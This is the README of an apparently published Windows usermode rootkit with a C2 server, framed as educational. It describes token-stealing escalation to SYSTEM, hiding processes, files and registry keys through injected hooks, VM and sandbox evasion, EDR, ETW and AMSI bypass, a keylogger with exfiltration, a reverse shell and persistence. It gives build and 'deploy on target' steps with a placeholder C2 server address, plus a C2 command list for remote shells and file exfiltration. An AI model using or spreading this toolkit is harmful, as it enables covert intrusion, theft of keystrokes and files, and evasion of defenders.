# Userland Rootkit with C2

![C2 screenshot](https://github.com/28Zaaky/Usermode-Rootkit/blob/82292f2a6d0c4f46ad9b3db686fc275e6ce17589/Capture%20d'%C3%A9cran%202025-12-12%20173844.png)

Windows usermode rootkit implementing stealth techniques, privilege escalation, and C2 infrastructure for research purposes.

> **Educational Use Only**  
> This repository contains a **proof-of-concept** of usermode rootkit techniques for research and defensive learning purposes.
>
> Running or modifying this code on systems you do not own or without explicit written authorization is **illegal and unethical**.  
> This project is for **research, learning, and defense development** only.

## Features

**Privilege Escalation:**
- Token stealing (winlogon.exe → SYSTEM)
- Named Pipe impersonation
- SeDebugPrivilege escalation

**Stealth & Hiding:**
- Inline hooking (x64 trampolines) for process/file/registry hiding
- DLL injection via CreateRemoteThread
- IPC synchronization with memory-mapped files
- String obfuscation (custom crypto)

**Anti-Analysis:**
- VM detection (5 methods: CPUID, registry, hardware checks)
- Debugger detection (PEB, timing, NtQueryInformationProcess)
- Sandbox evasion (uptime, user activity, resource checks)
- NTDLL unhooking (EDR bypass)
- ETW/AMSI patching

**C2 Infrastructure:**
- HTTPS server with web dashboard (Flask, port 8443)
- Interactive shell with cmd.exe redirection
- TCP reverse shell with SYSTEM token
- Real-time keylogger with exfiltration
- File exfiltration support
- 15+ remote commands

**Persistence:**
- Scheduled Task (trigger: logon)
- Registry Run key
- WMI Event Subscription

**Evasion:**
- Indirect syscalls (SysWhispers-style)
- API hashing (djb2)
- JitterSleep() timing variance
- RAII handle management

## Build

**Requirements:**
- MinGW-w64 (GCC 15.2+)
- Windows 10/11 x64
- PowerShell 5.1+

**Compilation:**
```powershell
.\build.ps1
```

**Output** (`deploy_package/`):
- `r00tkit.exe` - Main rootkit (1.14 MB)
- `processHooks.dll` - Process hiding (2.74 MB)
- `fileHooks.dll` - File system hiding (2.74 MB)
- `registryHooks.dll` - Registry hiding (2.74 MB)
- `PrivEsc_C2.exe` - Privilege escalation binary
- `Dropper.exe` - HTTP deployment dropper

## Deployment

**1. Configure C2:**
Edit `dropper/Dropper.cpp`:
```cpp
const wchar_t *HTTP_SERVER = L"YOUR_SERVER_IP";
const wchar_t *C2_SERVER_URL = L"https://YOUR_SERVER_IP:8443";
```

**2. Start Infrastructure:**
```bash
# C2 Server
cd server
python c2_server.py
# Dashboard: https://localhost:8443/dashboard

# HTTP Server (for dropper)
python http_server.py
# Serves files on port 8000
```

**3. Deploy on Target:**
```powershell
# Option A: Direct execution (requires Admin)
.\r00tkit.exe

# Option B: Dropper (downloads + installs to AppData)
.\Dropper.exe
```

## C2 Commands

```
hide_process <name>       Hide process from Task Manager
hide_file <path>          Hide file/folder from Explorer
hide_registry <key>       Hide registry key from Regedit
unhide_process <name>     Restore process visibility
unhide_file <path>        Restore file visibility
unhide_registry <key>     Restore registry key visibility
unhide_all                Restore all hidden items

privesc                   Escalate to SYSTEM via Named Pipe or token stealing
revshell_system <ip:port> Launch TCP reverse shell with SYSTEM token

revshell_start            Start interactive cmd.exe session
revshell_input <cmd>      Execute command in session
revshell_output           Read buffered output
revshell_stop             Terminate session

shell <cmd>               Execute single shell command
exfil <path>              Exfiltrate file content
sleep <seconds>           Set beacon interval
die                       Stop rootkit
```

## Architecture

```
rootkit.exe
├── Anti-Analysis checks (VM, debugger, sandbox)
├── NTDLL unhooking + ETW/AMSI bypass
├── Persistence installation (Task + Registry + WMI)
├── C2 connection (HTTPS beacon loop)
└── Keylogger (low-level hook)

On-demand injection:
├── taskmgr.exe → processHooks.dll (hide processes)
├── explorer.exe → fileHooks.dll (hide files)
└── regedit.exe → registryHooks.dll (hide registry keys)
```

## Detection Evasion

**Binary Obfuscation:**
- Strip symbols (`-s`)
- Remove RTTI (`-fno-rtti`)
- Optimize size (`-Os`)
- Garbage collect sections (`--gc-sections`)
- Compile-time string encryption

**Runtime Evasion:**
- Indirect syscalls (no direct ntdll calls)
- API resolution via hashing (no Import Address Table entries)
- Jitter on all sleep operations (±20% variance)
- RAII handle management (no leaked handles)

**Anti-Detection:**
- Create process with `CREATE_NEW_PROCESS_GROUP` flag
- Beacon interval configurable via C2
- Self-hiding via processHooks.dll injection

## Technical Notes

**Inline Hooking:**
- 14-byte x64 trampoline (`mov rax, addr; jmp rax`)
- Original prologue backup for unhooking
- VirtualProtect for RWX permissions

**Token Stealing:**
1. Enable SeDebugPrivilege
2. Find winlogon.exe PID via snapshot
3. Open process with NtOpenProcess (indirect syscall)
4. Duplicate token with MAXIMUM_ALLOWED
5. Impersonate via ImpersonateLoggedOnUser

**Indirect Syscalls:**
- Fresh ntdll.dll loaded from disk
- SSN extraction from clean copy
- Syscall gadget location via pattern search
- DoSyscall stub (dosyscall.S) for execution

**C2 Protocol:**
- HTTPS with self-signed certificates
- XOR encryption (key: 0x7D)
- Agent registration with unique ID (PID + timestamp)
- Task queue with result storage

**Contact:** 28zaakypro@proton.me